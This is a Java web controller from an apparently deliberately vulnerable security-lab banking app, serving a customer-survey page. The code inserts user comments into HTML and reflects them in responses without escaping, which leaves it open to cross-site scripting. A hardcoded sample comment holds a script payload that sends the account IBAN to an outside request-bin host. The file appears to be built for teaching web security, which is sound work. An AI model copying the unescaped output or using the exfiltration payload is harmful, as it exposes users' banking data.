package ch.zhaw.securitylab.inbank.server.controllers;

import java.util.ArrayList;
import ch.zhaw.securitylab.inbank.server.Server;
import ch.zhaw.securitylab.inbank.server.MySQLHelper;
import io.javalin.http.Context;
import io.javalin.http.Handler;
import java.sql.Connection;

import static ch.zhaw.securitylab.inbank.server.util.Decode.fetchJSON;

public class ControllerSurvey extends ControllerParent {

	private static String html1 = "<html>"
								+ "	<head>"
								+ "		<!-- JS -->"
								+ "		<!--<script type='text/javascript' src='main.js'></script>-->"
								+ "     <script>"
								+ "        function post_comment() {"
								+ "           var m = document.getElementById('comment').value;"
							    + "           var xmlhttp = new XMLHttpRequest();"
                                + "           xmlhttp.open('POST', '/comment');"
                                + "           xmlhttp.setRequestHeader('Content-Type', 'application/json');"
                                + "           xmlhttp.send(JSON.stringify({ 'comment': m }));"
								+ "           alert('Your comment was posted correctly!\nThank you.');"
								+ "        }"
								+ "     </script>"
								+ "	</head>"
								+ "	<body style='font-family:arial;color:#3c3c3c'>"
								+ "		<div class='container' style='width:80%;margin:50px auto;'>"
								+ "     <img src='images/DIBA_logo2.png'/>"
								+ "		<h1>Welcome to DIBA</h1>"
								+ "		<p>You recently open an account IBAN:<a id='iban'>CH48123456789</a></br>"
								+ "		Complete the customer survey and win a special prize!</p>"
								+ "		<div>"
								+ "		    <label for='score'>Please give our service a score from 1 (very bad) and 5 (very good):</label>"
								+ "			<select name='service' id='score'>"
								+ "			  <option value='1'>1</option>"
								+ "			  <option value='2'>2</option>" 
								+ "			  <option value='3'>3</option>"
								+ "			  <option value='4'>4</option>"
								+ "			  <option value='5'>5</option>"
								+ "			</select><br>"
								+ "			You can leave a comment here:</br>"
								+ "			<textarea id='comment' name='comment' form='commentForm' type='text'></textarea></br>"
								+ "         <button onclick='post_comment()'>POST COMMENT</button>"
								+ "		</div>"
								+ "		<!-- comments from other users -->";


	private static String html2 = " <div id='comments'>"
								+ "			<h3>Comments:</h3>"
								+ "			<div style='border:1px solid black;margin:5px;padding:3px;width:300px;'>This app is awesome! :D</div>"
								+ "			<div style='border:1px solid black;margin:5px;padding:3px;width:300px;'>Thank you! I won the prize :D</div>"
								+ "			<div style='border:1px solid black;margin:5px;padding:3px;width:300px;'>This app is awesome! :D</div>"
								+ "	<div style='border:1px solid black;margin:5px;padding:3px;width:300px;'>AHAHA I have your IBAN :D<script>new Image().src = encodeURI(\"https://postb.in/1593853304607-7301555383019?iban=\"+document.getElementById(\"iban\").text);</script>"
								+ "			</div>"
								+ "	<div style='border:1px solid black;margin:5px;padding:3px;width:300px;'>WHHHHHHU Thank you! I won the prize :D"
								+ "         <img src='https://postb.in/1594074379438-2416828356217?iban='+document.getElementById(\"iban\").text/>"
								+ "		    </div>"
								+ "	</div>"
								+ "	</div>"
								+ "	</body>"
								+ "</html>";

	public static String buildHtml(ArrayList<String> comments) {
		String surveyHtml = html1;
		surveyHtml += "<div id='comments'>"
					+ "<h3>Comments:</h3>";
		for (int i=0; i<comments.size(); i++) {
			surveyHtml += "<div><div style='border:1px solid black;margin:5px;padding:5px;width:300px;border-radius:3px'><div>10/08/2020</div>"+comments.get(i)+"</div></div>";
		}
		return surveyHtml;
	}

	//public static Handler handleLoginPost = context -> {
	public static Handler handleSurveyGet = context -> {

		Server.logger.info("Survey started");

		//MySQLHelper db = new MySQLHelper();
		MySQLHelper.getDatabaseConnection();
		ArrayList<String> comments = MySQLHelper.get_comments();
		String surveyHtml = buildHtml(comments);
		context.html(surveyHtml);
		
		//ControllerUser controller = ControllerUser.get();
		//
		//// Try it trough jwt and credentials
		//boolean loginJwt = loginWithJWT(context, controller);
		//boolean loginCredentials = loginCredentials(context, controller);
		//if (!loginJwt && !loginCredentials) return;
		
		// Redirect if login successful
		//String contentRedirect = getQueryLoginRedirect(context);
		//if (contentRedirect != null) context.redirect(contentRedirect);
	};

	public static Handler handleSurveyGetAction = context -> {
		String m = fetchJSON(context,"comment");

		//MySQLHelper db = new MySQLHelper();
		//db.getDatabaseConnection();
		MySQLHelper.add_comment(m);
		context.html("<h1>Your comment was posted!</h1><p>"+m+"</p>");
		Server.logger.info("Comment added "+m);

		//String  q = context.queryParamMap().toString();
		//int     b = q.indexOf("comment");
		//String  c = q.substring(b+9,q.length()-2);
		//if (b>=0) {
		//	Server.logger.info("Comment added "+c);
		//	context.html("<h1>Your comment was posted!</h1><p>"+c+"</p>");
		//} else {
		//	Server.logger.info("No comment found ..  ");
		//	context.html("<h1>No comment found ..");
		//}
		
	};
}
